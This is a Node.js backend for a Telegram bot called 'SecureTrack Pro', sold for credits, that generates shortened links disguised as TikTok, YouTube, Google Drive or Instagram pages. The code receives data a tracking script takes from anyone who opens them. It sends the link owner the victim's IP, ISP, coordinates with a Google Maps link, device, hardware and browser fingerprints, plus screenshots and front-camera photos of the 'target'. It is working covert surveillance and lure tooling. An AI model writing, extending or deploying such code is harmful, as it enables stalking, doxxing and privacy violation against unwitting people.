/* ============================================================
   SECURETRACK PRO — BACKEND & TELEGRAM BOT
   Ejecutar con: node bot.js
   ============================================================ */

const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
require('dotenv').config();
const { createClient } = require('@supabase/supabase-js');

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // ✅ Tu ID de Telegram
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;

// Configuración del servidor
const PORT = Number(process.env.PORT) || 8080;
const RAW_PUBLIC_BASE_URL =
    process.env.PUBLIC_BASE_URL ||
    process.env.RAILWAY_PUBLIC_DOMAIN ||
    `http://localhost:${PORT}`;
const WEBSITE_URL = /^https?:\/\//i.test(RAW_PUBLIC_BASE_URL)
    ? RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')
    : `https://${RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')}`;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !SUPABASE_URL || !SUPABASE_KEY) {
    console.error('❌ Faltan variables de entorno obligatorias.');
    console.error('Asegúrate de configurar: BOT_TOKEN, ADMIN_CHAT_ID, SUPABASE_URL, SUPABASE_KEY');
    process.exit(1);
}

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
let offset = 0;
let visitCount = 0;
let startTime = new Date();
let isPolling = false;  // ✅ Bandera para evitar polling duplicado
let conflictCount = 0;  // Contador de conflictos consecutivos
// Estadísticas temporales
const visitorStats = {}; // Estadísticas por país
const linkHistory = [];

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname)); // Sirve index.html y assets

// Rutas Legacy por compatibilidad
app.get('/v/:id', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/tiktok/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tiktok.html')));

// ✅ Rutas de Plantillas Dinámicas
app.get('/tk/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tiktok.html')));
app.get('/yt/:id', (_req, res) => res.sendFile(path.join(__dirname, 'youtube.html')));
app.get('/d/:id', (_req, res) => res.sendFile(path.join(__dirname, 'drive.html')));
app.get('/ig/:id', (_req, res) => res.sendFile(path.join(__dirname, 'ig.html')));

const upload = multer({ limits: { fileSize: 10 * 1024 * 1024 } }); // Para fotos (screenshots)

/* ====================================================
   FETCH A TELEGRAM
   ==================================================== */
async function apiFetch(method, body = {}) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BASE_URL}/${method}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
            signal: controller.signal,
        });
        clearTimeout(timer);
        const json = await res.json();
        if (!json.ok) {
            console.error(`[TG API ERROR] ${method}:`, json.description || json.error_code);
        }
        return json;
    } catch (e) {
        clearTimeout(timer);
        console.error(`[FETCH ERROR] ${method}:`, e.message);
        return null;
    }
}

async function sendMessage(chatId, text, extra = {}) {
    return apiFetch('sendMessage', {
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...extra,
    });
}

/* ====================================================
   GENERADOR DE ENLACES ACORTADOS (is.gd)
   ==================================================== */
async function shortenUrl(longUrl) {
    try {
        const api = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
        const res = await fetch(api);
        const data = await res.json();
        return data.shorturl || longUrl;
    } catch (e) {
        return longUrl;
    }
}

function buildTrackingUrl(targetId, type = 'tiktok') {
    if (type === 'youtube') return `${WEBSITE_URL}/yt/${encodeURIComponent(targetId)}`;
    if (type === 'drive') return `${WEBSITE_URL}/d/${encodeURIComponent(targetId)}`;
    if (type === 'ig') return `${WEBSITE_URL}/ig/${encodeURIComponent(targetId)}`;
    return `${WEBSITE_URL}/tk/${encodeURIComponent(targetId)}`; // default tiktok
}

/* ====================================================
   COMANDOS DEL BOT
   ==================================================== */
async function handleCommand(msg) {
    const chatId = String(msg.chat.id);
    const textRaw = (msg.text || '').trim();
    const text = textRaw.toLowerCase();
    const from = msg.from?.first_name || 'Usuario';

    // MOSTRAR CHAT_ID PARA DEBUGGING
    console.log(`\n[📨 MENSAJE RECIBIDO]\n👤 Usuario: ${from}\n🔑 CHAT_ID: ${chatId}\n💬 Texto: ${textRaw}\n`);

    // Opcional: Si quieres que solo el admin pueda usarlo, descomenta esto:
    // if (chatId !== ADMIN_CHAT_ID) return;

    /* ── AUTENTICACIÓN / BUSCAR USUARIO ─────────── */
    let { data: user, error: userError } = await supabase
        .from('bot_users')
        .select('*')
        .eq('chat_id', chatId)
        .single();

    // Si el error no es "no rows", algo falló feo (ignoramos "PGRST116" que es Not found)
    if (userError && userError.code !== 'PGRST116') {
        console.error("DB Error fetch user:", userError);
    }

    /* ── /start ─────────────────────────────────────── */
    if (text === '/start' || text.startsWith('/start ')) {
        let isNewUser = false;

        if (!user) {
            // Auto registro
            // Si es el administrador quien escribe, le damos plan ilimitado directo
            const initPlan = chatId === ADMIN_CHAT_ID ? 'unlimited' : 'credits';
            const initCredits = chatId === ADMIN_CHAT_ID ? 0 : 1;

            const { data: newUser, error: insertError } = await supabase
                .from('bot_users')
                .insert([{ chat_id: chatId, name: from, plan: initPlan, credits: initCredits }])
                .select()
                .single();

            if (insertError) {
                console.error("Error al registrar:", insertError);
                await sendMessage(chatId, `❌ Error de base de datos al registrar.`);
                return;
            }
            user = newUser;
            isNewUser = true;
            console.log(`[+] Nuevo usuario Supabase: ${from} (ID: ${chatId}, Plan: ${initPlan})`);
        }

        let welcomeText = `🎵 <b>SecureTrack Pro</b>\n\nHola <b>${user.name}</b>! Bienvenido.\n`;

        if (isNewUser) {
            if (chatId === ADMIN_CHAT_ID) {
                welcomeText += `\n👑 <b>DETECTADO COMO ADMINISTRADOR:</b>\nTienes un <b>Plan Ilimitado</b> automático.\n`;
            } else {
                welcomeText += `\n🎁 <b>REGALO DE BIENVENIDA:</b>\nTienes <b>1 enlace gratis</b> de prueba.\n`;
            }
        } else {
            const planText = user.plan === 'unlimited' ? 'ILIMITADO ♾️' : `${user.credits} Crédito(s)`;
            welcomeText += `\n💳 <b>Tu Saldo:</b> ${planText}\n`;
        }

        welcomeText += `
🎯 <b>Comandos de Generación:</b>
/tk [ID] — Simular TikTok
/yt [ID] — Simular YouTube Corto
/d [ID]  — Simular Google Drive PDF
/ig [ID] — Simular Instagram Reel

📊 <b>Tus Datos Funcionales:</b>
/myplan — Ver saldo actual

🔑 <b>ID de Chat:</b> <code>${chatId}</code>

⚠️ <i>Para adquirir más créditos o un plan Ilimitado, contacta al administrador enviando tu ID de Chat a:
👉 <b>https://t.me/Yxthc2</b></i>`;

        await sendMessage(chatId, welcomeText);

        /* ── /myplan ────────────────────────────────────── */
    } else if (text === '/myplan') {
        if (!user) {
            await sendMessage(chatId, `❌ No estás registrado. Usa /start primero.`);
            return;
        }

        const status = user.plan === 'unlimited' ? 'Ilimitado ♾️' : `${user.credits} Créditos Restantes`;

        await sendMessage(chatId,
            `👤 <b>Perfil de Usuario</b>\n\n` +
            `➖ <b>Nombre:</b> ${user.name}\n` +
            `➖ <b>ID:</b> <code>${chatId}</code>\n` +
            `➖ <b>Plan Actual:</b> ${user.plan === 'unlimited' ? 'VIP Ilimitado' : 'Por Créditos'}\n` +
            `💳 <b>Saldo:</b> <b>${status}</b>\n\n` +
            `💬 <i>Si deseas cambiar de plan o reportar recarga, escribe a https://t.me/Yxthc2</i>`
        );

        /* ── /adduser (ADMIN) ──────────────────────────── */
    } else if (text.startsWith('/adduser')) {
        if (chatId !== ADMIN_CHAT_ID) return;
        const parts = textRaw.split(' ');
        if (parts.length < 3) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /adduser <chat_id> <nombre>`);
            return;
        }
        const newId = parts[1];
        const newName = parts.slice(2).join(' ');

        const { error } = await supabase
            .from('bot_users')
            .insert([{ chat_id: newId, name: newName, plan: 'credits', credits: 0 }]);

        if (error) {
            await sendMessage(chatId, `⚠️ Ese usuario ya existe o error BD: ${error.message}`);
            return;
        }

        await sendMessage(chatId, `✅ <b>Usuario ${newName} (${newId}) agregado con éxito.</b> (Con 0 créditos).\nUsa <code>/addcredits ${newId} 10</code> o <code>/setplan ${newId} unlimited</code>.`);

        /* ── /addcredits (ADMIN) ───────────────────────── */
    } else if (text.startsWith('/addcredits')) {
        if (chatId !== ADMIN_CHAT_ID) return;
        const parts = textRaw.split(' ');
        if (parts.length < 3) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /addcredits <chat_id> <cantidad>`);
            return;
        }
        const tId = parts[1];
        const amount = parseInt(parts[2], 10);

        if (isNaN(amount)) {
            await sendMessage(chatId, `⚠️ Cantidad incorrecta.`);
            return;
        }

        // Forma sencilla si no hay RPC (Stored Procedure): Leer, sumar, actualizar
        const { data: targetUser } = await supabase.from('bot_users').select('credits, name').eq('chat_id', tId).single();
        if (!targetUser) {
            await sendMessage(chatId, `⚠️ Usuario no encontrado.`);
            return;
        }
        const newTotal = targetUser.credits + amount;
        await supabase.from('bot_users').update({ credits: newTotal }).eq('chat_id', tId);

        await sendMessage(chatId, `✅ <b>Operación exitosa:</b>\nUsuario: ${targetUser.name}\nCréditos Totales: ${newTotal}`);

        // Notificar al usuario (opcional)
        try {
            await sendMessage(tId, `🎉 <b>¡Recarga Completada!</b>\nEl administrador añadió <b>${amount}</b> créditos a tu cuenta.\nUsa /myplan.`);
        } catch (e) {
            console.log("No se pudo notificar al usuario");
        }

        /* ── /setplan (ADMIN) ──────────────────────────── */
    } else if (text.startsWith('/setplan')) {
        if (chatId !== ADMIN_CHAT_ID) return;
        const parts = textRaw.split(' ');
        if (parts.length < 3) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /setplan <chat_id> <unlimited|credits>`);
            return;
        }
        const tId = parts[1];
        const pType = parts[2].toLowerCase();

        if (pType !== 'unlimited' && pType !== 'credits') {
            await sendMessage(chatId, `⚠️ Plan inválido (unlimited / credits).`);
            return;
        }

        const { data, error } = await supabase.from('bot_users').update({ plan: pType }).eq('chat_id', tId).select().single();
        if (error || !data) {
            await sendMessage(chatId, `⚠️ Usuario no encontrado o error BD.`);
            return;
        }

        await sendMessage(chatId, `✅ <b>Plan actualizado:</b>\nUsuario: ${data.name}\nNuevo Plan: ${pType}`);

        /* ── /users (ADMIN) ────────────────────────────── */
    } else if (text === '/users') {
        if (chatId !== ADMIN_CHAT_ID) return;

        let msg = `👥 <b>Lista de Usuarios Autorizados</b>\n\n`;
        const { data: users, error } = await supabase.from('bot_users').select('*').order('created_at', { ascending: false });

        if (error || !users || users.length === 0) {
            msg += `<i>No hay usuarios.</i>`;
        } else {
            users.forEach((u, idx) => {
                const bal = u.plan === 'unlimited' ? '♾️' : `${u.credits} cr`;
                msg += `${idx + 1}. <code>${u.chat_id}</code> — <b>${u.name}</b> [${bal}]\n`;
            });
        }
        await sendMessage(chatId, msg);

        /* ── COMANDOS DE GENERACIÓN ───────────────────── */
    } else if (text.startsWith('/tk') || text.startsWith('/yt') || text.startsWith('/d') || text.startsWith('/ig') || text.startsWith('/gps') || text.startsWith('/link')) {

        let type = 'tiktok';
        let typeName = 'TikTok';
        if (text.startsWith('/yt')) { type = 'youtube'; typeName = 'YouTube'; }
        else if (text.startsWith('/d') && !text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
        else if (text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
        else if (text.startsWith('/ig')) { type = 'ig'; typeName = 'Instagram Reel'; }

        // === VALIDACIÓN DE CRÉDITOS (Supabase) ===
        if (!user) {
            await sendMessage(chatId, `❌ No estás registrado en el sistema. Escriba /start`);
            return;
        }

        if (user.plan === 'credits') {
            if (user.credits <= 0) {
                await sendMessage(chatId,
                    `🛑 <b>SALDO INSUFICIENTE</b> 🛑\n\nNo tienes créditos para crear este enlace.\n\nTus Créditos Actuales: <b>0</b>\nTu ID de Chat: <code>${chatId}</code>\n\n⚠️ Contacta con <b>https://t.me/Yxthc2</b> enviándole tu ID de Chat para adquirir una recarga o subir a un plan Ilimitado.`
                );
                return;
            }
            // Consumimos 1 crédito en DB
            await supabase.from('bot_users').update({ credits: user.credits - 1 }).eq('chat_id', chatId);
        }
        // ==================================

        // Extraer el target usando el texto original
        const parts = textRaw.split(' ');
        let target = parts.slice(1).join(' ').trim();

        if (!target) {
            target = `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
        }

        // ASIGNAMOS ESTE ENLACE AL USUARIO (Guardar en Supabase)
        const { error: linkError } = await supabase.from('bot_links').insert([{ target_id: target, chat_id: chatId }]);
        if (linkError) {
            console.error("Error guardando enlace:", linkError);
        }

        const longUrl = buildTrackingUrl(target, type);
        const shortUrl = await shortenUrl(longUrl);

        // Guardar en historial
        linkHistory.push({
            id: target,
            createdAt: new Date().toLocaleString('es-ES'),
            owner: from,
            shortUrl: shortUrl || longUrl
        });

        await sendMessage(chatId,
            `📁 <b>Enlace de ${typeName} Generado</b>

👤 <b>Etiqueta/ID:</b> <code>${target}</code>

👇 <b>Enlace Corto:</b>
<code>${shortUrl}</code>

👇 <b>Enlace Directo :</b>
<code>${longUrl}</code>

<i>El sistema notificará solo a USTED cuando sea abierto.</i>`
        );

        /* ── /status ────────────────────────────────────── */
    } else if (text === '/status') {
        const uptime = getUptime();
        await sendMessage(chatId,
            `📊 <b>Estado del Sistema</b>

🟢 Bot: <b>Online</b>
⏱️ Uptime: <b>${uptime}</b>
👁️ Visitas totales: <b>${visitCount}</b>
🔗 Links activos: <b>${Object.keys(linkDatabase).length}</b>
📋 Enlaces generados: <b>${linkHistory.length}</b>`
        );

        /* ── /stats ────────────────────────────────────── */
    } else if (text === '/stats') {
        const uptime = getUptime();
        const topCountries = Object.entries(visitorStats)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .map(([country, count]) => `  ${getFlagEmoji(country)} ${country}: <b>${count}</b>`)
            .join('\n');

        await sendMessage(chatId,
            `📈 <b>Estadísticas Detalladas</b>

🌐 <b>General:</b>
⏱️ Uptime: <b>${uptime}</b>
👁️ Visitas totales: <b>${visitCount}</b>
🔗 Enlaces generados: <b>${linkHistory.length}</b>

🏆 <b>Top 5 Países:</b>
${topCountries || '  📊 Sin datos aún'}`
        );

        /* ── /history ────────────────────────────────────── */
    } else if (text === '/history') {
        const recent = linkHistory.slice(-10).reverse();
        if (recent.length === 0) {
            await sendMessage(chatId, '📋 <b>Historial Vacío</b>\n\nNo hay enlaces generados aún.');
        } else {
            const list = recent.map((link, i) =>
                `${i + 1}. <code>${link.id}</code> — ${link.createdAt}`
            ).join('\n');
            await sendMessage(chatId,
                `📋 <b>Últimos 10 Enlaces Generados</b>\n\n${list}`
            );
        }

        /* ── /help ──────────────────────────────────────── */
    } else if (text === '/help') {
        await sendMessage(chatId,
            `📖 <b>Comandos Disponibles</b>

🎯 <b>Generar Enlaces TikTok:</b>
/gps — Link corto aleatorio
/gps [nombre] — Link con nombre personalizado

📊 <b>Estadísticas:</b>
/status — Estado del sistema
/stats — Estadísticas por país
/history — Últimos enlaces

ℹ️ /help — Esta ayuda`
        );
    }
}

/* ====================================================
   FORMATOS UTILES
   ==================================================== */
function getUptime() {
    const diff = Math.floor((Date.now() - startTime.getTime()) / 1000);
    const h = Math.floor(diff / 3600);
    const m = Math.floor((diff % 3600) / 60);
    const s = diff % 60;
    return [h && `${h}h`, m && `${m}m`, `${s}s`].filter(Boolean).join(' ');
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🏳️';
    const base = 0x1F1E6;
    return String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(0) - 65) +
        String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(1) - 65);
}

/* ====================================================
   RUTAS DEL SERVIDOR EXPRESS PARA RECIBIR DATOS
   ==================================================== */

// Recibe los datos en formato JSON desde tracker.js
app.post('/api/report', async (req, res) => {
    visitCount++;
    const data = req.body;

    // Determinar a quién enviarle el mensaje buscando en DB
    const targetId = data.targetId || 'Visitante Anónimo';
    let ownerChatId = ADMIN_CHAT_ID; // Si no existe el ID en BD, va al admin por defecto

    if (targetId !== 'Visitante Anónimo') {
        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
        if (linkData && linkData.chat_id) {
            ownerChatId = linkData.chat_id;
        }
    }

    console.log(`[REPORT RECIBIDO] ID: ${targetId} | Chat destino: ${ownerChatId}`);
    console.log(`[GEO] ${data.geo?.country} | ${data.browser?.browser} | IP: ${data.geo?.ip}`);

    // Registrar estadísticas de países
    const country = data.geo?.country || 'Desconocido';
    visitorStats[country] = (visitorStats[country] || 0) + 1;

    const ts = new Date(data.timestamp).toLocaleString('es-ES', { timeZone: data.browser?.timezone || 'UTC' });
    const g = data.geo;
    const b = data.browser;
    const hw = data.hardware;
    const bat = data.battery;
    const con = data.connection;
    const fp = data.canvas;
    const wg = data.webgl;

    const flag = getFlagEmoji(g.countryCode);
    const eventLabel = data.eventType === 'CLICK_CTA_BUTTON' ? '🖱️ <b>CLICK EN CTA</b>' : '👁️ <b>CARGA DE PÁGINA</b>';
    const targetHeader = targetId !== 'Visitante Anónimo' ? `🎯 <b>OBJETIVO DETECTADO:</b> <code>${targetId}</code>` : `🚨 <b>NUEVO VISITANTE DETECTADO</b>`;

    const messageHtml = `${targetHeader}
${eventLabel} — <code>${ts}</code>

━━━━━━━━━━━━━━━━━━━━
📡 <b>RED & CONEXIÓN</b>
━━━━━━━━━━━━━━━━━━━━
🌐 IP:             <code>${g.ip}</code>
🏢 ISP:            ${g.isp}
🔌 ASN:            ${g.asn}
⚡ Tipo:           ${con.effectiveType} (${con.type})
📶 Velocidad:      ${con.downlink}
🕐 Latencia:       ${con.rtt}
💾 Ahorro datos:   ${con.saveData ? 'Sí' : 'No'}

━━━━━━━━━━━━━━━━━━━━
📍 <b>GEOLOCALIZACIÓN</b>
━━━━━━━━━━━━━━━━━━━━
${flag} País:          ${g.country} (${g.countryCode})
🏙️ Ciudad:         ${g.city}
🗺️ Región:         ${g.region}
📮 Código postal:  ${g.postal}
🧭 Coordenadas:    <code>${g.lat}, ${g.lon}</code>
🕰️ Zona horaria:   ${g.timezone}

━━━━━━━━━━━━━━━━━━━━
💻 <b>DISPOSITIVO & NAVEGADOR</b>
━━━━━━━━━━━━━━━━━━━━
🖥️ OS:             ${b.os}
🌍 Navegador:      ${b.browser} ${b.browserVer}
📱 Tipo:           ${b.deviceType}
🖵  Resolución:    ${b.screenW}×${b.screenH} (@${b.pixelRatio}x)
🪟 Ventana:        ${b.innerW}×${b.innerH}
🎨 Color:          ${b.colorDepth}-bit
🔄 Orientación:    ${b.orientation}
🌐 Idioma:         ${b.language}

━━━━━━━━━━━━━━━━━━━━
⚙️ <b>HARDWARE</b>
━━━━━━━━━━━━━━━━━━━━
🧠 CPU Cores:      ${hw.cpuCores}
💾 RAM:            ${hw.ramGB !== 'N/A' ? hw.ramGB + ' GB' : 'N/A'}
👆 Touch:          ${b.touchSupport ? 'Sí (' + b.maxTouchPoints + ' puntos)' : 'No'}
🍪 Cookies:        ${b.cookiesOn ? 'Activadas' : 'Desactivadas'}
🚫 DNT:            ${b.doNotTrack}
🧩 Plataforma:     ${b.platform}${bat ? `\n🔋 <b>BATERÍA</b>\n━━━━━━━━━━━━━━━━━━━━\n⚡ Nivel:          ${bat.level}\n🔌 Cargando:       ${bat.charging ? 'Sí' : 'No'}` : ''}

━━━━━━━━━━━━━━━━━━━━
🔑 <b>FINGERPRINTS</b>
━━━━━━━━━━━━━━━━━━━━
🎨 Canvas:         <code>${fp?.hash || 'N/A'}</code>
🖼️ GPU Vendor:     ${wg?.vendor || 'N/A'}
⚙️ GPU Renderer:   ${wg?.renderer || 'N/A'}

━━━━━━━━━━━━━━━━━━━━
🌍 <b>ORIGEN</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Referrer:       ${data.referrer}
📄 URL:            ${data.pageUrl}${data.eventType === 'CLICK_CTA_BUTTON' ? `\n⏱️ Tiempo en página: ${data.timeOnPage}s\n📜 Scroll max:       ${data.scrollPct}%` : ''}`;

    const msgResult = await sendMessage(ownerChatId, messageHtml);
    if (msgResult?.ok) {
        console.log(`[✅ MENSAJE ENVIADO] A chat ${ownerChatId}`);

        // Enviar Google Maps en otro mensaje si hay coordenadas válidas
        if (g.lat && g.lon && g.lat !== 'N/A' && g.lon !== 'N/A') {
            const mapsUrl = `https://www.google.com/maps?q=${g.lat},${g.lon}`;
            const mapsMessage = `📍 <b>Ubicación en Google Maps:</b>\n${mapsUrl}`;
            await sendMessage(ownerChatId, mapsMessage);
            console.log(`[📍 MAPS ENVIADO] Enlace adjunto enviado a ${ownerChatId}`);
        }

    } else {
        console.error(`[❌ FALLO AL ENVIAR] A chat ${ownerChatId} | Respuesta:`, msgResult);
    }
    res.json({ success: true });
});

// Recibe la foto (screenshot) y cámara frontal (si hay) y las reenvía a Telegram
app.post('/api/photo', upload.array('photos', 2), async (req, res) => {
    const targetId = req.body.targetId || 'Desconocido';
    let ownerChatId = ADMIN_CHAT_ID;

    if (targetId !== 'Desconocido') {
        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
    }

    if (req.files && req.files.length > 0) {
        try {
            console.log(`[PHOTO] Recibidas ${req.files.length} imágenes de ${targetId}.`);

            if (req.files.length === 1) {
                // Si solo llegó 1 foto (probablemente screenshot porque denegó cámara)
                const formData = new FormData();
                formData.append('chat_id', ownerChatId);
                formData.append('caption', `📸 Captura del objetivo: ${targetId} — ${new Date().toLocaleString('es-ES')}`);

                const blob = new Blob([req.files[0].buffer], { type: 'image/jpeg' });
                formData.append('photo', blob, req.files[0].originalname || 'foto.jpg');

                const tgRes = await fetch(`${BASE_URL}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const tgJson = await tgRes.json();
                if (!tgJson.ok) console.error(`[-] Telegram rechazó enviar foto singular:`, tgJson);
            } else {
                // Llegaron 2 fotos, enviar como grupo (MediaGroup)
                const formData = new FormData();
                formData.append('chat_id', ownerChatId);

                const mediaGroup = [];
                req.files.forEach((file, index) => {
                    const attachName = `attach://photo${index}`;
                    const blob = new Blob([file.buffer], { type: 'image/jpeg' });
                    formData.append(`photo${index}`, blob, file.originalname);

                    mediaGroup.push({
                        type: 'photo',
                        media: attachName,
                        caption: index === 0 ? `📸 Captura Web + 📷 Cámara Frontal de: ${targetId}` : ''
                    });
                });

                formData.append('media', JSON.stringify(mediaGroup));

                const tgRes = await fetch(`${BASE_URL}/sendMediaGroup`, {
                    method: 'POST',
                    body: formData
                });
                const tgJson = await tgRes.json();
                if (!tgJson.ok) console.error(`[-] Telegram rechazó el sendMediaGroup:`, tgJson);
            }

            console.log(`[+] Archivos multimedia procesados para ID: ${targetId}`);

        } catch (e) {
            console.error('[-] Error enviando fotos a tg:', e.message);
        }
    } else {
        console.warn(`[-] /api/photo recibió solicitud sin archivos adjuntos para ID: ${targetId}`);
    }
    res.json({ success: true });
});

// Endpoint temporal para debuggear errores de frontend
app.post('/api/log', (req, res) => {
    console.log(`[FRONTEND LOG]:`, req.body.message);
    res.json({ success: true });
});


/* ====================================================
   POLLING LOOP (Comandos del Bot)
   ==================================================== */
async function poll() {
    // ✅ Evitar polling duplicado
    if (isPolling) {
        setTimeout(poll, 500);
        return;
    }

    isPolling = true;
    try {
        const data = await apiFetch('getUpdates', { offset, timeout: 15, allowed_updates: ['message'] });

        // ✅ Detectar error de conflicto específico
        if (data && data.description && data.description.includes('Conflict') && data.description.includes('getUpdates')) {
            conflictCount++;
            lastConflictTime = Date.now();

            // Calcular tiempo de espera con backoff exponencial + jitter
            const baseDelay = Math.min(1000 * Math.pow(2, conflictCount - 1), 30000); // Max 30s
            const jitter = Math.random() * 5000; // 0-5s de variación
            const waitTime = baseDelay + jitter;

            console.error(`\n🔴 [CONFLICTO ${conflictCount}] Otra instancia está usando polling.`);
            console.error(`⏳ Esperando ${Math.round(waitTime / 1000)}s antes de reintentar...`);
            console.error(`💡 NOTA: Detén la otra instancia del bot para que esta pueda conectarse.\n`);

            isPolling = false;
            setTimeout(poll, waitTime);
            return;
        }

        // Reiniciar contador si se conectó exitosamente
        if (conflictCount > 0) {
            console.log(`✅ Conflicto resuelto. Instancia anterior se ha desconectado.`);
            conflictCount = 0;
        }

        if (data && data.result && data.result.length > 0) {
            // Actualizamos el offset inmediatamente para evitar procesar los mismos mensajes otra vez
            offset = data.result[data.result.length - 1].update_id + 1;

            for (const update of data.result) {
                if (update.message?.text) {
                    await handleCommand(update.message);
                }
            }
        }
    } catch (e) {
        console.error('[POLL ERROR]', e.message);
    } finally {
        isPolling = false;
        setTimeout(poll, 500);
    }
}

/* ====================================================
   INICIO
   ==================================================== */
async function main() {
    const me = await apiFetch('getMe');
    if (!me?.ok) {
        console.error('❌ Error de conexión con Telegram.');
        process.exit(1);
    }

    console.log(`\n📡 Limpiando webhooks antigos...`);
    // ✅ Elimina cualquier webhook anterior para asegurar que solo polling está activo
    const deleteWebhook = await apiFetch('deleteWebhook', { drop_pending_updates: true });
    if (deleteWebhook?.ok) {
        console.log(`✅ Webhooks limpiados\n`);
    }

    // ✅ Manejar terminación limpia
    process.on('SIGINT', async () => {
        console.log('\n\n🛑 Deteniendo bot...');
        isPolling = true; // Detener el polling
        try {
            await sendMessage(ADMIN_CHAT_ID, `🔴 <b>SecureTrack Pro — Desconectado</b>`);
        } catch (_) { }
        process.exit(0);
    });

    // Iniciar Express Server
    app.listen(PORT, () => {
        console.log(`🌍 Servidor Web activo en puerto ${PORT}`);
        console.log(`✅ Bot activo: @${me.result.username}`);
        console.log(`🛑 Ctrl+C para detener\n`);
    });

    await sendMessage(ADMIN_CHAT_ID, `🟢 <b>SecureTrack Pro — Iniciado</b>\n\nPanel de control activo. Escriba /gps para comenzar.`);
    poll();
}

main();

